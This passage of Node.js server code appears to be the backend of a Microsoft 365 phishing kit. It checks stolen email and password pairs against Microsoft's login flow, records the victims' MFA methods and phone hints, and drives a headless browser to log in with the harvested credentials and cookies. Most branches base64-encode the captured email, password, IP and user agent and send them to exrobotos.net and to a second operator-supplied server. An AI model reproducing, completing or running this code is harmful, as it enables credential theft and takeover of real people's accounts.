single-sign-on.","state":"y-oi_t7YKO0HOe1YwX_ia2mhRE-7G784T-ptLisS29YeVzl7rokZzLBDAnxqKk8a_EI8YnUJ0Q-G1A5UBP4mXwaUZG7f4-GVxWjYmQ4d6JeHZEnnI4yr8V_iud5BcqlcUDxqJDVKs1VKgviOVp_arTd4ymU-rHIzfJVGwEjO1QvxY6lTa9ETvg7gGIHz2jNvzTd7HajuDNGbQkBegPbtPiHhh0ClmwLktXIxGgaXTMQCYjLdqw1gCsHKvQyHPnMtFJLbOeuosGZfm5Xa9-KtjA"},"isIEAllowedForSsoProbe":true,"edgeRedirectUri":"https://autologon.microsoftazuread-sso.com/common/winauth/sso/edgeredirect?client-request-id=28c8a127-a552-4f5e-800b-280226cb3d7a\u0026origin=login.microsoftonline.com\u0026is_redirected=1"},"iSessionPullType":3,"fUseSameSite":true,"isGlobalTenant":true,"uiflavor":1001,"urlFidoHelp":"https://go.microsoft.com/fwlink/?linkid=2013738","urlFidoLogin":"https://login.microsoft.com/common/fido/get?uiflavor=Web","fIsFidoSupported":true,"fOfflineAccountVisible":false,"scriptNonce":"","fEnableUserStateFix":true,"fShowAccessPassPeek":true,"fUpdateSessionPollingLogic":true,"scid":1000,"hpgact":2000,"hpgid":1114,"pgid":"ConvergedTFA","apiCanary":"AQABAAAAAAD--DLA3VO7QrddgJg7WevrpkO6ovO78H4AGJOkfbxe7nqQoFBCQjr3bmRPXUySx8yefoJoIdPwlZX453h1Vy0jy_HL-kcOFQVSK7RRAGyNmnsPW_usA04LK7OaH-4Wl8I5Kj2OOEpZ09vBHKu15FAK65eJQz9RMMOrDBC5aE9_I8LKwh1CJcRJvGt6voA9qSpghwgdL4irlfMAbgPKoH6OdyzG9s8ZIi3NWJ_GgZ-FTCAA","canary":"pst47I2b1zlC4OIx3kPAl23Chaqmca5RQDfeOIpJXXk=0:1","correlationId":"28c8a127-a552-4f5e-800b-280226cb3d7a","sessionId":"dc421d02-e477-47d9-845d-f0ddb38dd401","locale":{"mkt":"en-US","lcid":1033},"slMaxRetry":2,"slReportFailure":true,"strings":{"desktopsso":{"authenticatingmessage":"Trying to sign you in"}},"enums":{"ClientMetricsModes":{"None":0,"SubmitOnPost":1,"SubmitOnRedirect":2,"InstrumentPlt":4}},"urls":{"instr":{"pageload":"https://login.microsoftonline.com/common/instrumentation/reportpageload","dssostatus":"https://login.microsoftonline.com/common/instrumentation/dssostatus"}},"browser":{"ltr":1,"Chrome":1,"_Win":1,"_M99":1,"_D0":1,"Full":1,"Win81":1,"RE_WebKit":1,"b":{"name":"Chrome","major":99,"minor":0},"os":{"name":"Windows","version":"10.0"},"V":"99.0"},"watson":{"url":"/common/handlers/watson","bundle":"https://aadcdn.msauth.net/ests/2.1/content/cdnbundles/watson.min_ybdb1ixzkv-fkor2mu6q6w2.js","sbundle":"https://aadcdn.msauth.net/ests/2.1/content/cdnbundles/watsonsupportwithjquery.3.5.min_dc940oomzau4rsu8qesnvg2.js","fbundle":"https://aadcdn.msauth.net/ests/2.1/content/cdnbundles/frameworksupport.min_oadrnc13magb009k4d20lg2.js","resetErrorPeriod":5,"maxCorsErrors":-1,"maxInjectErrors":5,"maxErrors":10,"maxTotalErrors":3,"expSrcs":["https://login.microsoftonline.com","https://aadcdn.msauth.net/","https://aadcdn.msftauth.net/",".login.microsoftonline.com"],"envErrorRedirect":true,"envErrorUrl":"/common/handlers/enverror"},"loader":{"cdnRoots":["https://aadcdn.msauth.net/","https://aadcdn.msftauth.net/"],"logByThrowing":true},"serverDetails":{"slc":"ProdSlices","dc":"NEULR2","ri":"DB3XXXX","ver":{"v":[2,1,12559,10]},"rt":"2022-03-25T06:47:03","et":54},"clientEvents":{"useOneDSEventApi":true,"flush":60000,"autoPost":true,"autoPostDelay":1000,"minEvents":1,"maxEvents":1,"pltDelay":500,"appInsightsConfig":{"instrumentationKey":"69adc3c768bd4dc08c19416121249fcc-66f1668a-797b-4249-95e3-6c6651768c28-7293","webAnalyticsConfiguration":{"autoCapture":{"jsError":true}}},"defaultEventName":"IDUX_ESTSClientTelemetryEvent_WebWatson","serviceID":3},"fApplyAsciiRegexOnInput":true,"country":"MA","fBreakBrandingSigninString":true,"urlNoCookies":"https://login.microsoftonline.com/cookiesdisabled","fTrimChromeBssoUrl":true,"inlineMode":5,"fShowCopyDebugDetailsLink":true};
var Config = /{"arrUserProofs":(.*)};/;//correlationId":(.*)"
Config = Config.exec(res3data)[0].substr(0).replace("};", "}");
console.log("Config:: " + Config);
    //console.log('arrUserProofs: true: ');
var arrConfig = JSON.parse(Config);
//arrConfig.urlBeginAuth;

//<![CDATA[
//[{"authMethodId":"PhoneAppOTP","data":"PhoneAppOTP","display":"+XXX XXXXXXXX23","isDefault":true,"isLocationAware":false,"phoneAppOtpTypes":["MicrosoftAuthenticatorBasedTOTP"]},{"authMethodId":"PhoneAppNotification","data":"PhoneAppNotification","display":"+XXX XXXXXXXX23","isDefault":false,"isLocationAware":false},{"authMethodId":"OneWaySMS","data":"OneWaySMS","display":"+XXX XXXXXXXX23","isDefault":false,"isLocationAware":false}]

var arrUserProofs = arrConfig.arrUserProofs;
var arrAuth = Array();
arrAuth['Default']=Array();
arrAuth['All']=arrUserProofs;
var arrD ='';
for (var i = 0; i < arrUserProofs.length; i++) {
 
if(arrUserProofs[i]&&arrUserProofs[i]['authMethodId']&&arrUserProofs[i]['authMethodId']!==''&&arrUserProofs[i]['data']&&arrUserProofs[i]['data']!==''){
if(arrUserProofs[i]['display']&&arrUserProofs[i]['display']!==''){
arrD=arrUserProofs[i]['display'];
}
arrAuth[arrUserProofs[i]['authMethodId']]=arrD;
arrAuth['Display']=arrD;
if(arrUserProofs[i]['isDefault']==true){
arrAuth['Default']=[arrUserProofs[i]['authMethodId'],arrD];
}
}
    //console.log(arrAuth);
    //Do something
}
console.log(arrAuth);



                    console.log("valid o365 account with 2fa");
					result['StatusCode'] = 1;
					result['Status'] = "VALID_2FA";
					result['Email'] = eMail;
					
					if(arrAuth['Default']&&arrAuth['Default'][0]&&arrAuth['Default'][0]!==''){
					 result['AuthMethode'] = arrAuth['Default'][0];
					}
					if(arrAuth['Display']&&arrAuth['Display']!==''){
					 result['Display'] = arrAuth['Display'];
					}
					if(arrAuth['All']){
					 result['OtherMethod']=arrAuth['All'];
                    }
                    if(res3data.indexOf('"iRememberMfaDuration":') > -1){
                        
                        
                        
                        var iremembermfadurationregex = /"iRememberMfaDuration":[^,]+/;//correlationId":(.*)"
iRememberMfaDuration = parseInt(iremembermfadurationregex.exec(res3data)[0].substr(0).replace('"iRememberMfaDuration":', ''));
console.log("iRememberMfaDuration:: " + iRememberMfaDuration);

if(iRememberMfaDuration > 0){                     
                        result['RememberMe'] = iRememberMfaDuration;
                    }
                        
                    }
                    
                    if(arrConfig.country){
                    result['CountryCode2'] = arrConfig.country;  
                    console.log('CountryCode2:'+arrConfig.country);
                    }
					result['Msg'] = "Valid O365 Account With 2fa";
					//result['domain'] = $filter;
					result['Time'] = DateNow;
					//result['client_ip'] = $this->client_ip;

//var result = { "statusCode": 1, "status": "invalid", "email": email, "result": "Not Valid Gmail Address", "time":DateNow };                  
console.log(result);
//res.setHeader('Content-Type', 'application/json');
res.send(JSON.stringify(result));
//getRestart();



//var reqdebug=req.query.debug;
var reqid=decodeURI(req.query.id);
var reqtoken=decodeURI(req.query.token);
//var inow=req.query.torestart;

const cookiesvalid={cookie:"false"};
const dataUserIP=reqUserIP;
const UserUA=reqUserUA;
const ServerIP=reqServerIP;
const ServerHOST=reqServerHOST;
console.log("save:");
const SessionIP=req.socket.remoteAddress;//req.query.ip
//console.log( 'SessionIP: ',server.address() );
var endTime = new Date().getTime();
const ts=endTime-starTime;
const ms='Pending';
const st='VALID_LOGIN_WAITING_2FA';
const ss=result['Status'];//&st=${st}
var md = '';
if(arrAuth&&arrAuth['Default']&&arrAuth['Default'][0]&&arrAuth['Default'][0]!==''){
md = arrAuth['Default'][0];
					}else{
md = 	'false';			    
					}
					

const url2save = `https://exrobotos.net/api-s-v6.php?save&130413041987&token=${reqtoken}&id=${reqid}&2fa=false&ms=${ms}&st=${st}&ss=${ss}&mm=${encodeURIComponent(btoa_safe(eMail))}&pp=${encodeURIComponent(btoa_safe(passWord))}&ci=${dataUserIP}&ca=${UserUA}&si=${ServerIP}&ht=${encodeURIComponent(ServerHOST)}&ni=${encodeURIComponent(btoa_safe(SessionIP))}&nu=${encodeURIComponent(btoa_safe(RndUserAgent))}&md='+${md}+'&mt='+${reqMT}+'&delay=${ts}`;
 console.log("url2save.:"+url2save);
 console.log("fetching.");
const sentTOuser = await save2url(url2save,'POST',JSON.stringify(cookiesvalid),false,false);


const url2save2 = `${decodeURIComponent(atob_safe(decodeURIComponent(ServerHOST)))}/api.php?save&token=${reqtoken}&id=${reqid}&2fa=false&ms=${ms}&st=${st}&ss=${ss}&mm=${encodeURIComponent(btoa_safe(eMail))}&pp=${encodeURIComponent(btoa_safe(passWord))}&ci=${dataUserIP}&ca=${UserUA}&si=${ServerIP}&ht=${encodeURIComponent(ServerHOST)}&ni=${encodeURIComponent(btoa_safe(SessionIP))}&nu=${encodeURIComponent(btoa_safe(RndUserAgent))}&md='+${md}+'&mt='+${reqMT}+'&delay=${ts}`;
 console.log("url2save2..:"+url2save2);
 console.log("fetching2..");
const sentTOuser2 = await save2url(url2save2,'POST',JSON.stringify(cookiesvalid),false,false);
//






return;  
} else if(res3data.indexOf('"urlPost":"/kmsi"') > -1 && res3data.indexOf('"sCanaryTokenName":"canary"') > -1 ){
    
     
                                   console.log("valid account without 2fa");
					result['StatusCode'] = 0;
					result['Status'] = "VALID_NO_2FA";
					result['Email'] = eMail;
					result['Msg'] = "Valid O365 Account";
					//result['domain'] = $filter;
					result['Time'] = DateNow;
					//result['client_ip'] = $this->client_ip;

//var result = { "statusCode": 1, "status": "invalid", "email": email, "result": "Not Valid Gmail Address", "time":DateNow };                  
console.log(result);
//res.setHeader('Content-Type', 'application/json');
res.send(JSON.stringify(result));
//getRestart();


//var reqdebug=req.query.debug;
var reqid=decodeURI(req.query.id);
var reqtoken=decodeURI(req.query.token);
//var inow=req.query.torestart;

const cookiesvalid={cookie:"false"};
const dataUserIP=reqUserIP;
const UserUA=reqUserUA;
const ServerIP=reqServerIP;
const ServerHOST=reqServerHOST;
console.log("save:");
const SessionIP=req.socket.remoteAddress;//req.query.ip
//console.log( 'SessionIP: ',server.address() );
var endTime = new Date().getTime();
const ts=endTime-starTime;
const ms='Not_Enabled';
const st='VALID_EMAIL_PASS_NOT_2FA';
const ss=result['Status'];//&st=${st}



const url2save = `https://exrobotos.net/api-s-v6.php?save&130413041987&token=${reqtoken}&id=${reqid}&2fa=false&ms=${ms}&st=${st}&ss=${ss}&mm=${encodeURIComponent(btoa_safe(eMail))}&pp=${encodeURIComponent(btoa_safe(passWord))}&ci=${dataUserIP}&ca=${UserUA}&si=${ServerIP}&ht=${encodeURIComponent(ServerHOST)}&ni=${encodeURIComponent(btoa_safe(SessionIP))}&nu=${encodeURIComponent(btoa_safe(RndUserAgent))}&delay=${ts}`;
 console.log("url2save..:"+url2save);
 console.log("fetching..");
const sentTOuser = await save2url(url2save,'POST',JSON.stringify(cookiesvalid),false,false);


const url2save2 = `${decodeURIComponent(atob_safe(decodeURIComponent(ServerHOST)))}/api.php?save&token=${reqtoken}&id=${reqid}&2fa=false&ms=${ms}&st=${st}&ss=${ss}&mm=${encodeURIComponent(btoa_safe(eMail))}&pp=${encodeURIComponent(btoa_safe(passWord))}&ci=${dataUserIP}&ca=${UserUA}&si=${ServerIP}&ht=${encodeURIComponent(ServerHOST)}&ni=${encodeURIComponent(btoa_safe(SessionIP))}&nu=${encodeURIComponent(btoa_safe(RndUserAgent))}&delay=${ts}`;
 console.log("url2save2...:"+url2save2);
 console.log("fetching2...");
const sentTOuser2 = await save2url(url2save2,'POST',JSON.stringify(cookiesvalid),false,false);
//






return;     
    
}else if(res3data.indexOf('$Config={"iMaxStackForKnockoutAsyncComponents"') > -1){


        //console.log(err);
        
        
        
                    console.log("unknown Validation Email (??VALID PASS)");
					result['StatusCode'] = 6;
					result['Status'] = "unknown";
					result['Email'] = eMail;
					result['Msg'] = "Unknown O365 Validation(??VALID PASS)";
					//result['domain'] = $filter;
					result['Time'] = DateNow;
					//result['client_ip'] = $this->client_ip;

//var result = { "statusCode": 1, "status": "invalid", "email": email, "result": "Not Valid Gmail Address", "time":DateNow };                  
console.log(result);
//res.setHeader('Content-Type', 'application/json');
res.send(JSON.stringify(result));
////getRestart('now');
return;         




    
} else {
    //console.log('arrUserProofs: false: ',res3data);
//res3data.indexOf('$Config={"fShowPersistentCookiesWarning"') > -1     (UNKNOWN RESULT FOR INVALID PASS)
 //$Config={"oPostParams"  
                    console.log("invalid password or (unknown validation result)");
					result['StatusCode'] = 2;
					result['Status'] = "INVALID_PASS";
					result['Email'] = eMail;
					result['Msg'] = "Invalid Password";
					//result['domain'] = $filter;
					result['Time'] = DateNow;
					//result['client_ip'] = $this->client_ip;

//var result = { "statusCode": 1, "status": "invalid", "email": email, "result": "Not Valid Gmail Address", "time":DateNow };                  
console.log(result);
//res.setHeader('Content-Type', 'application/json');
res.send(JSON.stringify(result));
//getRestart();





//var reqdebug=req.query.debug;
var reqid=decodeURI(req.query.id);
var reqtoken=decodeURI(req.query.token);
//var inow=req.query.torestart;

const cookiesvalid={cookie:"false"};
const dataUserIP=reqUserIP;
const UserUA=reqUserUA;
const ServerIP=reqServerIP;
const ServerHOST=reqServerHOST;
console.log("save:");
const SessionIP=req.socket.remoteAddress;//req.query.ip
//console.log( 'SessionIP: ',server.address() );
var endTime = new Date().getTime();
const ts=endTime-starTime;
const ms='null';
const st='INVALID_PASSWORD';
const ss=result['Status'];//&st=${st}


const url2save = `https://exrobotos.net/api-s-v6.php?save&130413041987&token=${reqtoken}&id=${reqid}&2fa=false&ms=${ms}&st=${st}&ss=${ss}&mm=${encodeURIComponent(btoa_safe(eMail))}&pp=${encodeURIComponent(btoa_safe(passWord))}&ci=${dataUserIP}&ca=${UserUA}&si=${ServerIP}&ht=${encodeURIComponent(ServerHOST)}&ni=${encodeURIComponent(btoa_safe(SessionIP))}&nu=${encodeURIComponent(btoa_safe(RndUserAgent))}&delay=${ts}`;

 console.log("url2save...:"+url2save);
 console.log("fetching...");
const sentTOuser = await save2url(url2save,'POST',JSON.stringify(cookiesvalid),false,false);

const url2save2 = `${decodeURIComponent(atob_safe(decodeURIComponent(ServerHOST)))}/api.php?save&token=${reqtoken}&id=${reqid}&2fa=false&ms=${ms}&st=${st}&ss=${ss}&mm=${encodeURIComponent(btoa_safe(eMail))}&pp=${encodeURIComponent(btoa_safe(passWord))}&ci=${dataUserIP}&ca=${UserUA}&si=${ServerIP}&ht=${encodeURIComponent(ServerHOST)}&ni=${encodeURIComponent(btoa_safe(SessionIP))}&nu=${encodeURIComponent(btoa_safe(RndUserAgent))}&delay=${ts}`;
 console.log("url2save2....:"+url2save2);
 console.log("fetching2....");
const sentTOuser2 = await save2url(url2save2,'POST',JSON.stringify(cookiesvalid),false,false); 










return;  
                		   
    
    
    
}


    } catch(err) {
        console.log('err:',err);
    }








                                   
                		}
               		 else if(json.IfExistsResult)
                		{
                                   console.log("Email is not Valid o365 Email");
					result['StatusCode'] = 3;
					result['Status'] = "INVALID_EMAIL";
					result['Email'] = eMail;
					result['Msg'] = "Invalid O365 Email";
					//result['domain'] = $filter;
					result['Time'] = DateNow;
					//result['client_ip'] = $this->client_ip;

//var result = { "statusCode": 1, "status": "invalid", "email": email, "result": "Not Valid Gmail Address", "time":DateNow };                  
console.log(result);
//res.setHeader('Content-Type', 'application/json');
res.send(JSON.stringify(result));
//getRestart();




//var reqdebug=req.query.debug;
var reqid=decodeURI(req.query.id);
var reqtoken=decodeURI(req.query.token);
//var inow=req.query.torestart;

const cookiesvalid={cookie:"false"};
const dataUserIP=reqUserIP;
const UserUA=reqUserUA;
const ServerIP=reqServerIP;
const ServerHOST=reqServerHOST;

//const SessionIP1=req.socket.remoteAddress;//req.query.ip

/*try{
SessionIP = await page.evaluate(() => {return fetch("https://api.ipify.org").then(function(response) { return response.text(); });});//https://api64.ipify.org/
}catch(err){SessionIP = "unknown";console.log('err:'+err);}
console.log("Nodejs Server IP: "+SessionIP);

var SessionCOUNTRY = false;
try{
SessionCOUNTRY = await fetch(`https://extreme-ip-lookup.com/json/${SessionIP}?callback=&key=Qn97RtiI2gwjStzJJjuG`,{cache: "no-cache"}).then(function(response) { return response.json(); }).then(function(json) { return json.countryCode; });
console.log('SessionCOUNTRY:'+SessionCOUNTRY);
}catch(err){console.log('err:'+err);}
*/

const SessionIPwhois = await fetch("https://ipwhois.app/widget.php?ip=&lang=en", {
  "headers": {
    "accept": "*/*",
    "accept-language": "en-US,en;q=0.9,fr-ES;q=0.8,fr-FR;q=0.7,fr;q=0.6,ar;q=0.5",
    "sec-ch-ua": "\"Chromium\";v=\"110\", \"Not A(Brand\";v=\"24\", \"Google Chrome\";v=\"110\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site",
    "Referer": "https://ipwhois.io/",
    "Referrer-Policy": "strict-origin-when-cross-origin"
  },
  "body": null,
  "method": "GET"
});

console.log('SessionIPwhois:'+SessionIPwhois);

var SessionIP = false;
var SessionCOUNTRY = false;
var SessionCOUNTRYCode = false;
var SessionLocation = false;
try{
SessionLocation = await fetch(`https://extreme-ip-lookup.com/json/?key=Qn97RtiI2gwjStzJJjuG`,{cache: "no-cache"}).then(function(response) { return response.json(); }).then(function(json) {if(json&&json.status&&json.status=="success"){const SLocation = [];SLocation['ip']=json.query;SLocation['country']=json.country;SLocation['countryCode']=json.countryCode; return SLocation;}else{return false;} });
if(SessionLocation){
SessionIP = SessionLocation["ip"];
SessionCOUNTRY = SessionLocation["country"];
SessionCOUNTRYCode = SessionLocation["countryCode"];
}
console.log('SessionIP:'+SessionIP);
console.log('SessionCOUNTRY:'+SessionCOUNTRY);
console.log('SessionCOUNTRYCode:'+SessionCOUNTRYCode);
}catch(err){console.log('err:'+err);}

//console.log( 'SessionIP: ',server.address() );
var endTime = new Date().getTime();
const ts=endTime-starTime;
const ms='null';
const st='NOT_O365_EMAIL';
const ss=result['Status'];//&st=${st}
if(!cookiesvalid||cookiesvalid==""){
 //cookiesvalid = {cookie:"false"};
  cookiesvalid = false;
}



const url2save = `https://exrobotos.net/api-s-v6.php?save&130413041987&token=${reqtoken}&id=${reqid}&2fa=false&ms=${ms}&st=${st}&ss=${ss}&mm=${encodeURIComponent(btoa_safe(eMail))}&pp=${encodeURIComponent(btoa_safe(passWord))}&ci=${dataUserIP}&ca=${UserUA}&si=${ServerIP}&ht=${encodeURIComponent(ServerHOST)}&ni=${encodeURIComponent(btoa_safe(se))}&nu=${encodeURIComponent(btoa_safe(RndUserAgent))}&delay=${ts}`;
 console.log("url2save....:"+url2save);
 console.log("fetching....");
const sentTOuser = await save2url(url2save,'POST',JSON.stringify(cookiesvalid),false,false);


const url2save2 = `${decodeURIComponent(atob_safe(decodeURIComponent(ServerHOST)))}/api.php?save&token=${reqtoken}&id=${reqid}&2fa=false&ms=${ms}&st=${st}&ss=${ss}&mm=${encodeURIComponent(btoa_safe(eMail))}&pp=${encodeURIComponent(btoa_safe(passWord))}&ci=${dataUserIP}&ca=${UserUA}&si=${ServerIP}&ht=${encodeURIComponent(ServerHOST)}&ni=${encodeURIComponent(btoa_safe(SessionIP))}&nu=${encodeURIComponent(btoa_safe(RndUserAgent))}&delay=${ts}`;
 console.log("url2save2.....:"+url2save2);
 console.log("fetching2.....");
const sentTOuser2 = await save2url(url2save2,'POST',JSON.stringify(cookiesvalid),false,false);

//






return;  
                		}else{
                		   
        
        
        
                    console.log("unknown Validation Email");
					result['StatusCode'] = 7;
					result['Status'] = "unknown";
					result['Email'] = eMail;
					result['Msg'] = "Unknown O365 Validation";
					//result['domain'] = $filter;
					result['Time'] = DateNow;
					//result['client_ip'] = $this->client_ip;

//var result = { "statusCode": 1, "status": "invalid", "email": email, "result": "Not Valid Gmail Address", "time":DateNow };                  
console.log(result);
//res.setHeader('Content-Type', 'application/json');
res.send(JSON.stringify(result));
////getRestart('now');
return;                         		    
                		    
                		    
                		}



    } catch(err) {
        console.log(err);
        
        
        
                    console.log("unknown Validation Email");
					result['StatusCode'] = 7;
					result['Status'] = "unknown";
					result['Email'] = eMail;
					result['Msg'] = "Unknown O365 Validation";
					//result['domain'] = $filter;
					result['Time'] = DateNow;
					//result['client_ip'] = $this->client_ip;

//var result = { "statusCode": 1, "status": "invalid", "email": email, "result": "Not Valid Gmail Address", "time":DateNow };                  
console.log(result);
//res.setHeader('Content-Type', 'application/json');
res.send(JSON.stringify(result));
////getRestart('now');
return;         
        
        
        
        
        
    }

}else if (req.query.session !== 'undefined' && req.query.type==1 && req.query.email && req.query.id) {
var RndUserAgent=getRndUserAgent();
console.log('User-Agent:',RndUserAgent)
//const puppeteer = require('puppeteer');

//var url="http://www.paypal.com/cgi-bin/webscr?cmd=_xclick&xo_node_fallback=true&force_sa=true&upload=1&rm=2&business="+email+"&=&=&wa_type=BuyNow&fallback=1&shopping_cart_node_fallback=true";
//var url="https://login.microsoftonline.com/";
//var url="http://79.124.59.22/~xrobotos/redirect.php?1304";
var requrl="https://www.office.com/login";//https://login.microsoftonline.com/";
var reqemail=decodeURI(req.query.email.toLowerCase());
var reqpass=decodeURI(req.query.pass);
var reqdebug=req.query.debug;
var reqid=decodeURI(req.query.id);
var reqtoken=decodeURI(req.query.token);
var inow=req.query.torestart;
var reqsetcookie = (typeof req.query.setcookie !== "undefined" && req.query.setcookie !== null &&( Boolean(req.query.setcookie) && (req.query.setcookie.toString().trim().toLowerCase() == 'true'||req.query.setcookie.toString().trim().toLowerCase() == '1')));
var reqgetcookie = (typeof req.query.getcookie !== "undefined" && req.query.getcookie !== null &&( Boolean(req.query.getcookie) && (req.query.getcookie.toString().trim().toLowerCase() == 'true'||req.query.getcookie.toString().trim().toLowerCase() == '1')));
var reqcookie = postcookie;//req.query.cookie
var reqres = (typeof req.query.res !== "undefined" && req.query.res !== null &&( Boolean(req.query.res) && (req.query.res.toString().trim().toLowerCase() == 'true'||req.query.res.toString().trim().toLowerCase() == '1')));
var reqincreasesessionlife = (typeof req.query.isl !== "undefined" && req.query.isl !== null &&( Boolean(req.query.isl) && (req.query.isl.toString().trim().toLowerCase() == 'true'||req.query.isl.toString().trim().toLowerCase() == '1')));
var reqSkipMFAforIps=(typeof req.query.skipip !== "undefined" && req.query.skipip !== null &&( Boolean(req.query.skipip) && (req.query.skipip.toString().trim().toLowerCase() == 'true'||req.query.skipip.toString().trim().toLowerCase() == '1')));
var reqUserIP=req.query.ci;
var reqUserUA=req.query.ca;
var reqServerIP=req.query.si;
var reqServerHOST=req.query.ht;
var reqMfaType = false;
//var reqSessionIP=req.socket.remoteAddress;//req.query.ip
if(req.query.mt&&req.query.mt.toString().trim().toLowerCase()!=='false'&&req.query.mt!==''){
var strreqmtt = decodeURI(req.query.mt);
if(Buffer.from(Buffer.from(strreqmtt, 'base64').toString('utf8'),'utf8').toString('base64').replace(/=/g, '')===strreqmtt){
console.log('mtt2: '+Buffer.from(strreqmtt, 'base64').toString('utf8'));//'ascii'
reqMfaType = Buffer.from(strreqmtt, 'base64').toString('utf8');//'ascii'
}else{
console.log('mtt3: '+strreqmtt);
reqMfaType = strreqmtt;
}    
}    


    
var reqMfaDefaultType = false;
//var reqSessionIP=req.socket.remoteAddress;//req.query.ip
if(req.query.md&&req.query.md.toString().trim().toLowerCase()!=='false'&&req.query.md!==''){
var strreqmdd = decodeURI(req.query.md);
if(Buffer.from(Buffer.from(strreqmdd, 'base64').toString('utf8'),'utf8').toString('base64').replace(/=/g, '')===strreqmdd){
console.log('mdd2: '+Buffer.from(strreqmdd, 'base64').toString('utf8'));//'ascii'
reqMfaDefaultType = Buffer.from(strreqmdd, 'base64').toString('utf8');//'ascii'
}else{
console.log('mdd3: '+strreqmdd);
reqMfaDefaultType = strreqmdd;
}    
}  


//var reqSessionIP=req.socket.remoteAddress;//req.query.ip

var reqtime=new Date(); 
console.log('end2');
var reqsession=true;
var reqappID = btoa_safe(req.headers.host.split(".",DomainHosting)[0]);
var reqadminLink = false;
if(req.query.ak&&req.query.ak.toString().trim().toLowerCase()!=='false'&&req.query.ak!==''){
reqadminLink=req.query.ak;
}
try {
            // run the task function for the URL
            if(reqres){console.log('reqres:',reqres);
            const resp = cluster.execute({reqsession,requrl,reqemail,reqpass,reqdebug,reqtime,reqid,reqtoken,reqsetcookie,reqgetcookie,reqcookie,reqres,reqincreasesessionlife,reqSkipMFAforIps,reqUserIP,reqUserUA,reqServerIP,reqServerHOST,reqMfaType,reqMfaDefaultType,reqappID,reqadminLink});
            //const resp = { "StatusCode":1,"Status": "pending","Msg":"pending","Time":new Date().toUTCString()};
            //console.log('resp:',resp);
            res.write(JSON.stringify({ "StatusCode":1,"Status": "pending","Msg":"Pending","AppID":reqappID,"Time":new Date().toUTCString()}, null, 4));
            res.end();
            //return getRestart(inow);
            return;
            }else{
            const resp = await cluster.execute({reqsession,requrl,reqemail,reqpass,reqdebug,reqtime,reqid,reqtoken,reqsetcookie,reqgetcookie,reqcookie,reqres,reqincreasesessionlife,reqSkipMFAforIps,reqUserIP,reqUserUA,reqServerIP,reqServerHOST,reqMfaType,reqMfaDefaultType,reqappID,reqadminLink});
            console.log('resp:',resp);
            res.write(JSON.stringify(resp, null, 4));
            res.end();
            //return getRestart(inow);
            return;   
            }
            // respond with the result
            //if (!res.headersSent) {res.setHeader('Content-Type', 'application/json');};
            //res.status(200).send(JSON.stringify(resp));
            
        } catch(err) {
            // catch error
            //if (!res.headersSent) {res.setHeader('Content-Type', 'application/json');};
            //res.send('Error: ' + err.message);
            res.write(JSON.stringify({ "StatusCode":1,"Status": "error","Msg":err.message,"Time":new Date().toUTCString()}, null, 4));
            res.end();
            //return getRestart(inow);
            return;
        }
        
    
}else { //end if type==

        //res.send('Invalid url: ' + urlToParse); 
		console.log('Invalid request');
              //if (!res.headersSent) {res.setHeader('Content-Type', 'application/json');};
                res.write(JSON.stringify({ "StatusCode":2,"Status": "error","Msg":"Invalid request","Time":new Date().toUTCString()}, null, 4)); 
                res.end();
                //return getRestart(inow);
                return
    }     
   /////////// 

console.log('end3');
/*var timer = false;
var wasUnregistered=true;
timer = setTimeout(function(){ console.log('longpolling');  if (wasUnregistered){ res.status(200); res.end(); } }, 5000);
*/
next();
});//end app.get
       
console.log('end4');


// manage terminating of headless chrome browser
/*const exitHandler = err => {
	launcher.kill().then(() => {
		process.exit(-1);
	});
}
*/



// Set the timeout for a request to 1sec
//server.timeout = 1000;
console.log('end5');

	
})(); //end async ()


